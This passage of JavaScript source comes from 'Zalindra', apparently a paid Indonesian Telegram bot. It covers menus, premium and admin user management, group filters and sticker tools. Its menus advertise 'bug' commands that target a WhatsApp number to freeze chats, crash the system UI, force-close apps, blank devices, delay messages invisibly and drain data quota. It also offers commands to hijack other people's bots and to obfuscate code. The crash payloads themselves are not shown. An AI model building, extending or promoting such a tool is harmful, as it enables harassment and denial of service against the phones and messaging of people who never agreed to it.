    }

    return; 
  }

  return next();
});
// ===== Tracker ===== // ontol
const commandList = new Set();

const originalCommand = bot.command.bind(bot);

bot.command = (cmd, ...args) => {
  commandList.add(cmd);
  return originalCommand(cmd, ...args);
};

//${username} name target
//${ctx.from.id} id target
/// -------- ( menu utama ) --------- \\\
function mainMenu(ctx) {
  const username = ctx.from.username
    ? "@" + ctx.from.username
    : ctx.from.first_name;

  userState[ctx.from.id] = "home";

return ctx.replyWithPhoto(
  { url: homePhoto },
    {
      caption: `
<pre>꧁𖤍꧂  𝐙𝐀𝐋𝐈𝐍𝐃𝐑𝐀  ꧁𖤍꧂
━━━━━━━━━━━━━━━━━━━━━━━━━━

  𖧷 こんにちは — ${username}
  𖧷 Selamat datang di Zalindra
  𖧷 Gunakan dengan bijak, ね

━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⸸ 𝗜𝗡𝗙𝗢 ⸸
  ᯾  Owner     @FizOffc205
  ᯾  Dev       @seanoffcx

━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⸸ 𝐀𝐏𝐀 𝐘𝐆 𝐁𝐀𝐑𝐔 ⸸
  ᯾  fix all fisjjs
  ᯾  Tampilan newnew

━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⸸ 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 ⸸
  ᯾  Hash Protection
  ᯾  Pulling File Injector
  ᯾  Mismatch Hash Guard
  ᯾  Token Integrity Shield

━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⸸ 𝗣𝗥𝗜𝗖𝗘 ⸸
  ᯾  Free update 2× Rp 15.000
  ᯾  Full update    Rp 25.000
  ᯾  Reseller    Rp 50.000

━━━━━━━━━━━━━━━━━━━━━━━━━━
  𓆰 𝐙𝐀𝐋𝐈𝐍𝐃𝐑𝐀  ꞏ  @seanoffcx 𓆰
</pre>`,
      parse_mode: "HTML",

      
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "⌜🔜⌟ MENU UTAMA",
              callback_data: "menu_bug",
              icon_custom_emoji_id: "5875161424342290538",
              style: "danger"
            },
            {
              text: "⌜💥⌟ DEVELOPERS", 
          url: "https://t.me/seanoffcx", 
          style: "danger" 
            }
          ]
        ]
      }
    }
  );
}
//menu_bug
//menu-tools
//   • /buggroup ✆ Link/JID/Name
//     ⤷ Blank Click + Blank No Click (Not All Device)
 //  • /delaygc ✆ Link/JID/Name
//    ⤷ Delay All Member Group

//╭─ Bug Menu ─╮
  
//   • /𝐨𝐯𝐞𝐫𝐥𝐨𝐚𝐝𝐬 ✆ 62xx
//     ⤷ 𝐟𝐫𝐞𝐞𝐳𝐞 𝐭𝐲𝐩𝐞 𝐯𝐢𝐬𝐢𝐛𝐥𝐞
     
//  • /𝐠𝐥𝐨𝐰𝐞𝐮𝐬 ✆ 62xx
//     ⤷ 𝐤𝐢𝐥𝐥 𝐮𝐢 𝐬𝐢𝐬𝐭𝐞𝐦
     
//   • /𝐱𝐬𝐨𝐰 ✆ 62xx
//     ⤷ 𝐃𝐞𝐥𝐚𝐲 𝐡𝐚𝐫𝐝 𝐢𝐧𝐯𝐢𝐬𝐢𝐛𝐥𝐞! 
     
//   • /𝐱𝐟𝐨𝐫𝐜𝐞 ✆ 62xx
//     ⤷ 𝐟𝐨𝐫𝐜𝐞 𝐜𝐥𝐢𝐜𝐤 (𝐧𝐨𝐭 𝐚𝐥𝐥 𝐝𝐞𝐯𝐢𝐜𝐞) 
//     
//   • /𝐱𝐧𝐮𝐥𝐥 ✆ 62xx
//     ⤷ 𝐛𝐥𝐚𝐧𝐤 𝐡𝐚𝐫𝐝 𝐢𝐧 𝐩𝐥𝐚𝐜𝐞
     
//))  • /𝐱𝐦𝐛𝐠 ✆ 62xx
//     ⤷ 𝐝𝐫𝐚𝐢𝐧 𝐤𝐮𝐨𝐭𝐚
///     
//   • /𝐱𝐡𝐨𝐥𝐝 ✆ 62xx
///     ⤷ 𝐨𝐟𝐟 (𝐝𝐥𝐦 𝐦𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞!) 
//     
//╰─────────────╯

//╭─ 𝐆𝐫𝐨𝐮𝐩 𝐁𝐮𝐠𝐬 ─╮
//𝐜𝐨𝐦𝐢𝐧𝐠 𝐬𝐨𝐨𝐧,,, 
//╰─────────────╯

//“When galaxies fall, only darkness remains.”
//menu bug yg di close. 
// xcombo
// xspam
// xpire
bot.start((ctx) => mainMenu(ctx));
//𝙈𝙀𝙉𝙐 𝙋𝘼𝙂𝙀 2

bot.action("menu_bug", async (ctx) => {
  await ctx.answerCbQuery();

 
  if (userState[ctx.from.id] === "bug") return;

  userState[ctx.from.id] = "bug";

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: { url: bugPhoto },
        caption: `
<pre>꧁𖤍꧂  𝐙𝐀𝐋𝐈𝐍𝐃𝐑𝐀  ꧁𖤍꧂
━━━━━━━━━━━━━━━━━━━━━━━━━━

  𖧷 ようこそ — 

━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⸸ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⸸
  ᯾  ᴏᴡɴᴇʀs    @FizOffc205
  ᯾  ᴅᴇᴠᴇʟᴏᴘ    @seanoffcx
  ᯾  ᴠᴇʀsɪᴏɴ    v6.0 new era
  ᯾  ᴘʀᴇғɪx     /
  ᯾  ʟᴀɴɢᴜᴀɢᴇ     JavaScript

━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⸸ 𝙎𝙏𝘼𝙏𝙐𝙎 ⸸
⛧ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲: ${runtimeStatus}
⛧ 𝗠𝗲𝗺𝗼𝗿𝘆: ${memoryStatus}

━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⸸ 𝙎𝙀𝘾𝙐𝙍𝙄𝙏𝙔 ⸸
  ᯾  Kill link bypass         ✓
  ᯾  GitHub   ✓
  ᯾  enc invisible   ✓
  ᯾  protek anti crask   ✓

━━━━━━━━━━━━━━━━━━━━━━━━━━
  𓆰 ᴘᴀɢᴇ 01/04  ꞏ  𝙕𝘼𝙇𝙄𝙉𝘿𝙍𝘼 𓆰
</pre>`,
        parse_mode: "HTML"
      },
      {
        
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "⌜🔙⌟ 𝐁𝐚𝐜𝐤",
                callback_data: "menu_bug",
                icon_custom_emoji_id: "5875161424342290538",
                style: "danger"
              },
              {
                text: "⌜💥⌟ DEVELOPERS", 
          url: "https://t.me/seanoffcx", 
          style: "danger" 
              }
            ],
            [
              {
                text: "⌜🔜⌟ 𝐍𝐞𝐱𝐭",
                callback_data: "menu_tools",
                icon_custom_emoji_id: "6098148696057189408",
                style: "danger"
              }
            ]
          ]
        }
      }
    );
  } catch (err) {
    
    if (
      err.description &&
      err.description.includes("message is not modified")
    ) {
      return;
    }

    console.log("BUG MENU ERROR:", err);
  }
});


bot.action("menu_tools", async (ctx) => {
  await ctx.answerCbQuery();

  if (userState[ctx.from.id] === "tools") return;
  userState[ctx.from.id] = "tools";

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: { url: toolsPhoto },
        caption: `
<pre>꧁𖤍꧂  𝙕𝘼𝙇𝙄𝙉𝘿𝙍𝘼  ꧁𖤍꧂
━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⸸ 𝗖𝗢𝗡𝗧𝗥𝗢𝗟𝗦 ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

  𖧷 𝗦𝗲𝗻𝗱𝗲𝗿
  ᯾  /connect       Add Sender
  ᯾  /killsesi     Reset Session

  𖧷 𝗣𝗿𝗲𝗺𝗶𝘂𝗺
  ᯾  /addprem  id  Add Premium User
  ᯾  /delprem      Remove Premium User
  ᯾  /cekprem     cek all user prem
 
  𖧷 𝗦𝘆𝘀𝘁𝗲𝗺
  ᯾  /cmdaktif  mengaktifkan cmnd
  ᯾  /nonaktifkancmd   menonaktifkan cmnd
  ᯾  /listcmd    list cmnd off/on
  ᯾  /hapusbug  hapus bugs
  ᯾  /groupon  mode khusus group (on) 
  ᯾  /groupoff  mode khusus group (off) 
  

━━━━━━━━━━━━━━━━━━━━━━━━━━
  𓆰 ᴘᴀɢᴇ 02/04  ꞏ  𝙕𝘼𝙇𝙄𝙉𝘿𝙍𝘼 𓆰
</pre>`,
        parse_mode: "HTML"
      },
      {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "⌜🔙⌟ 𝐁𝐚𝐜𝐤",
                callback_data: "menu_bug",
                icon_custom_emoji_id: "4956282853882069908",
                style: "danger"
              }, 
              {
                text: "⌜💥⌟ DEVELOPERS", 
          url: "https://t.me/seanoffcx", 
          style: "danger" 
              }
            ],
            [
              {
                text: "⌜🔜⌟ 𝐍𝐞𝐱𝐭",
                callback_data: "tools_page2",
                icon_custom_emoji_id: "6098140406770307991",
                style: "danger"
              }
            ]
          ]
        }
      }
    );
  } catch (err) {
    if (
      err.description &&
      err.description.includes("message is not modified")
    ) return;

    console.log("TOOLS MENU ERROR:", err);
  }
});

bot.action("tools_page2", async (ctx) => {
  await ctx.answerCbQuery();

  try {
await ctx.editMessageMedia(
  {
    type: "photo",
    media: { url: toolsPhoto },
    caption: `
<pre>꧁𖤍꧂  𝙕𝘼𝙇𝙄𝙉𝘿𝙍𝘼  ꧁𖤍꧂
━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⸸ 𝗧𝗢𝗢𝗟𝗦 ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

  𖧷 𝐀𝐥𝐥
  ᯾  /public bot mode publik
  ᯾  /self bot mode privat
  ᯾  /brat      text sticker
  ᯾  /bratvid  brat text video
  ᯾  /cekid   cek id user
  ᯾  /removebg   hps background
  ᯾  /listharga     harga script
  ᯾  /ssiphone     ss iphone
  ᯾  /livejam     live jam
  ᯾  /stopjam  stop live jam
  ᯾  /enc     enc kode js
  ᯾  /rasukbot    rasuk bot orang
  ᯾  /convert     foto atau vt jdi url
  ᯾  /tiktokdl    unduh vid tnpa wm
  ᯾  /cekowner     Cek own bot
  ᯾  /antivideo   anti vid di gruop
  ᯾  /anticulik   anti culik bot

━━━━━━━━━━━━━━━━━━━━━━━━━━
  𓆰 ᴘᴀɢᴇ 03/05  ꞏ  𝙕𝘼𝙇𝙄𝙉𝘿𝙍𝘼 𓆰
</pre>`,
    parse_mode: "HTML"
  },
  {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "⌜🔙⌟ 𝐁𝐚𝐜𝐤",
                callback_data: "menu_tools",
                icon_custom_emoji_id: "4956282853882069908",
                style: "danger"
          },
          {
           text: "⌜💥⌟ DEVELOPERS", 
          url: "https://t.me/seanoffcx", 
          style: "danger" 
          }
        ],
        [
          {
           text: "⌜🔜⌟ 𝐍𝐞𝐱𝐭",
                callback_data: "back_home",
                icon_custom_emoji_id: "6098140406770307991",
                style: "danger"
          }
        ]
      ]
    }
  }
);
  } catch (err) {
    if (
      err.description &&
      err.description.includes("message is not modified")
    ) return;

    console.log("TOOLS PAGE2 ERROR:", err);
  }
});

bot.action("back_home", async (ctx) => {
  await ctx.answerCbQuery();

 
  if (userState[ctx.from.id] === "home") return;

  userState[ctx.from.id] = "home";

  const username = ctx.from.username
    ? "@" + ctx.from.username
    : ctx.from.first_name;

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: { url: homePhoto },
        caption: `
<pre>꧁𖤍꧂ 𝙕𝘼𝙇𝙄𝙉𝘿𝙍𝘼 ꧁𖤍꧂
━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⸸ 𝗕𝗨𝗚𝗦 ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

᯾ /overloads    frezee cht (not al device) ✅
᯾ /gloweus   kill ui sistem
᯾ /xsow    Delay hard invisible✅
᯾ /xforce   force (not all device)✅
᯾ /xnull     blank hard in place
᯾ /xmbg    Delay type combo 

━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚠ Addbot dulu sebelum pakai bug
━━━━━━━━━━━━━━━━━━━━━━━━━━
 𓆰 ᴘᴀɢᴇ 04/05 ꞏ 𝙕𝘼𝙇𝙄𝙉𝘿𝙍𝘼 𓆰
</pre>`,
        parse_mode: "HTML"
      },
      {
       
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "⌜🔙⌟ 𝐁𝐚𝐜𝐤",
                callback_data: "tools_page2",
                icon_custom_emoji_id: "4956282853882069908",
                style: "danger"
              },
              {
                text: "⌜🔜⌟ 𝐍𝐞𝐱𝐭",
                callback_data: "tq_too",
                icon_custom_emoji_id: "6098140406770307991",
                style: "danger"
              }
            ]
          ]
        }
      }
    );
  } catch (err) {
    if (
      err.description &&
      err.description.includes("message is not modified")
    ) {
      return;
    }

    console.log("BACK HOME ERROR:", err);
  }
});

bot.action("tq_too", async (ctx) => {
  await ctx.answerCbQuery();

 
  if (userState[ctx.from.id] === "too") return;

  userState[ctx.from.id] = "too";

  const username = ctx.from.username
    ? "@" + ctx.from.username
    : ctx.from.first_name;

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: { url: homePhoto },
        caption: `
<pre>꧁𖤍꧂  𝙕𝘼𝙇𝙄𝙉𝘿𝙍𝘼 ꧁𖤍꧂
━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⸸ 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 ⸸
━━━━━━━━━━━━━━━━━━━━━━━━━━

  𖧷 𝗧𝗲𝗮𝗺
  ᯾  @seanoffcx    Developer
  ᯾  @FizOffc205      Owner
  ᯾ 𝐀𝐋𝐋 𝐓𝐄𝐀𝐌 𝐙𝐀𝐋𝐈𝐍𝐃𝐑𝐀
  ᯾ Copy x-code🔥

  𖧷 𝗙𝗿𝐢𝐞𝐧𝐝𝐬
- no friends 🙃

  𖧷 𝗦𝗽𝗲𝗰𝗶𝗮𝗹
  ᯾  All buyer Zalindra 🫶

━━━━━━━━━━━━━━━━━━━━━━━━━━
  𓆰 ᴘᴀɢᴇ 05/05  ꞏ  𝙕𝘼𝙇𝙄𝙉𝘿𝙍𝘼 𓆰
</pre>`,
        parse_mode: "HTML"
      },
      {
       
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "⌜🔙⌟ 𝐁𝐚𝐜𝐤",
                callback_data: "back_home",
                icon_custom_emoji_id: "4956282853882069908",
                style: "danger"
              },
              {
                text: "⌜💥⌟ DEVELOPERS", 
          url: "https://t.me/seanoffcx", 
          style: "danger" 
              }
            ]
          ]
        }
      }
    );
  } catch (err) {
    if (
      err.description &&
      err.description.includes("message is not modified")
    ) {
      return;
    }

    console.log("BACK HOME ERROR:", err);
  }
});



/// ------ ( Plugins ) ------- \\\
function getUserId(ctx) {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return null;

  return args[1].replace(/[^0-9]/g, ""); 
}

/// CASE BUAT OWNER MENU ///
bot.command("cekprem", async (ctx) => {
  try {
    let target = ctx.from;

  
    if (ctx.message.reply_to_message) {
      target = ctx.message.reply_to_message.from;
    }

    const userId = target.id.toString();
    const firstName = target.first_name || "-";
    const lastName = target.last_name || "";
    const fullName = `${firstName} ${lastName}`.trim();
    const username = target.username ? `@${target.username}` : "Tidak ada username";

   
    const isUserPremium = premiumUsers.includes(userId);
    const isUserAdmin = adminList.includes(userId);
    const isUserOwner = ownerUsers.includes(userId);

    let status = "Non Premium ❌";

    if (isUserOwner) {
      status = "Owner 👑";
    } else if (isUserAdmin) {
      status = "Admin ⚡";
    } else if (isUserPremium) {
      status = "Premium 💎";
    }

  
    let groupStatus = "Private Chat";
    if (ctx.chat.type !== "private") {
      groupStatus = isGroupPremium(ctx.chat.id)
        ? "Group Premium ✅"
        : "Group Non Premium ❌";
    }

    const teks = `
<blockquote><strong>「 CEK STATUS USER 」</strong></blockquote>
👤 Nama: ${fullName}
🆔 ID: <code>${userId}</code>
🔗 Username: ${username}
💎 Status: ${status}
🏷️ Group: ${groupStatus}
💬 Chat ID: <code>${ctx.chat.id}</code>
`;

    await ctx.reply(teks, {
      parse_mode: "HTML"
    });

  } catch (e) {
    console.error("CEKPREM ERROR:", e);

    await ctx.reply(
      `❌ Error saat cek premium\n${e.message}`
    );
  }
});

bot.command("listcmd", checkAdmin, async (ctx) => {
  const data = loadCmdMode();
  const disabled = Array.isArray(data?.disabled) ? data.disabled : [];

  const allCommands = [...commandList];

  const active = allCommands.filter(c => !disabled.includes(c));

  const activeList = active.length
    ? active.map(c => `➤ /${c}`).join("\n")
    : "Tidak ada";

  const disabledList = disabled.length
    ? disabled.map(c => `➤ /${c}`).join("\n")
    : "Tidak ada";

  return ctx.replyWithPhoto(
    { source: fs.readFileSync("./image/zalindraoffc.jpg") },
    {
      caption:
`<pre>📊 SYSTEM COMMAND

┌─ ✅ CMD AKTIF
${activeList}

└─ ⛔ CMD NONAKTIF
${disabledList}</pre>`,
      parse_mode: "HTML"
    }
  );
});

bot.command("addgroupremium", checkOwner, async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini sudah PREMIUM");
    }

  
    premiumGroups.push(groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dijadikan PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("delgrouppremium", checkOwner, async (ctx) => {
  try {
    
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});


bot.command("addadmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addadmin 123");

  if (adminList.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah admin.`);
  }

  addAdmin(userId);
  ctx.reply(`✅ Berhasil tambah ${userId} jadi admin`);
});


bot.command("addprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addprem 123");

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`✅ Berhasil tambah ${userId} jadi premium`);
});


bot.command("deladmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /deladmin 123");

  if (!adminList.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di admin.`);
  }

  removeAdmin(userId);
  ctx.reply(`🚫 Berhasil hapus ${userId} dari admin`);
});


bot.command("delprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /delprem 123");

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di premium.`);
  }

  premiumUsers = premiumUsers.filter(id => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`🚫 Berhasil hapus ${userId} dari premium`);
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})


bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});


bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});

bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Group Sudah di Safe");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE Group dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
///// ×××××÷×××××××× ////
bot.command("cmdaktif", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1]?.toLowerCase();

  if (!cmd) return ctx.reply("❌ Contoh: /cmdaktif xspam janggan /xspam");

  const data = loadCmdMode();
  const disabled = data?.disabled || [];

  if (!disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sudah aktif`);
  }

  data.disabled = disabled.filter(c => c !== cmd);
  saveCmdMode(data);

  ctx.reply(`✅ Command /${cmd} berhasil diaktifkan`);
});

bot.command("nonaktifcmd", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1]?.toLowerCase();

  if (!cmd) return ctx.reply("❌ Contoh: /nonaktifcmd xspam janggan /xspam");

  const data = loadCmdMode();
  const disabled = data?.disabled || [];

  if (disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sudah nonaktif`);
  }

  disabled.push(cmd);

  data.disabled = disabled;
  saveCmdMode(data);

  ctx.reply(`⛔ Command /${cmd} berhasil dinonaktifkan`);
});
//// Tools ///
bot.command("bratvid", async (ctx) => {
  const chatId = ctx.chat.id;

  
  const text = ctx.message.text
    .split(" ")
    .slice(1)
    .join(" ")
    .trim();

  
  if (!text) {
    return ctx.reply(
      "⚠️ Contoh:\n/bratvid woi kontol"
    );
  }

  
  await ctx.reply(
    "🎬 Lagi bikin sticker videonya bre..."
  );

  try {
   
    const res = await fetch(
      `https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(
        text
      )}`
    );

   
    if (!res.ok) {
      throw new Error(
        `HTTP error ${res.status}`
      );
    }

  
    const buffer = Buffer.from(
      await res.arrayBuffer()
    );

  
    const tmpFile = path.join(
      __dirname,
      `bratvid_${Date.now()}.webm`
    );

    fs.writeFileSync(
      tmpFile,
      buffer
    );

  
    await ctx.replyWithSticker(
      {
        source: tmpFile
      }
    );

  
    fs.unlinkSync(
      tmpFile
    );

  } catch (e) {
    console.error(
      "BRATVID ERROR:",
      e
    );

    return ctx.reply(
      "❌ Gagal generate sticker video."
    );
  }
});

bot.command("removebg", async (ctx) => {
  const chatId = ctx.chat.id;

 
  if (
    !ctx.message.reply_to_message ||
    !ctx.message.reply_to_message.photo
  ) {
    return ctx.reply(
      "📸 *Silakan reply foto yang ingin dihapus background-nya.*",
      {
        parse_mode: "Markdown"
      }
    );
  }

  try {
    await ctx.reply("⏳ Sedang menghapus background...");

   
    const photo =
      ctx.message.reply_to_message.photo[
        ctx.message.reply_to_message.photo.length - 1
      ];

  
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

   
    const imageResponse = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

  
    const formData = new FormData();
    formData.append("size", "auto");
    formData.append(
      "image_file",
      Buffer.from(imageResponse.data),
      "image.jpg"
    );

  
    const response = await axios.post(
